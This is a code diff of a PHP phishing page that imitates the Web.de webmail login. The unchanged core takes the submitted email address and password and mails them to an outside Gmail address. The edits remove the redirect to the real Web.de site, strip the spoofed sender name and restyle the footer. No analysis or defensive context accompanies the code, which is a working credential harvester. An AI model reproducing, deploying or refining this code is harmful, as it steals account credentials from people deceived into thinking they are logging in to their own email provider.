@@ -1,13 +1,13 @@
 <?php
 if(isset($_POST['login'])) {
   extract($_POST); 
-  header("Location: https://mm.web.de/");
+  
   //send email
   $body="New Web.de details has been sent. \n\nEmail: $email \n Password: $password. \n\n Kind Regards";
 
   $header = 'MIME-Version: 1.0' . "\r\n";
   $header .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-  $header .= 'From: Web-de <quean29@gmail.com>' . "\r\n";
+  $header .= 'From: <quean29@gmail.com>' . "\r\n";
 
   $to = "quean29@gmail.com";
   $subject = "--NEW WEB.DE Details--";
@@ -150,7 +150,7 @@ if(isset($_POST['login'])) {
             </div>
         </div>
       </div>
-      <footer class="footer pt-3 pb-3 text-center">
+      <footer class="footer pt-3 pb-3 text-center" style="background-color: rgb (147, 146, 146);">
         <span>Impressum</span><br>
         <span>Vertrage heir kundigen</span><br>
         <span>AGB</span><br>
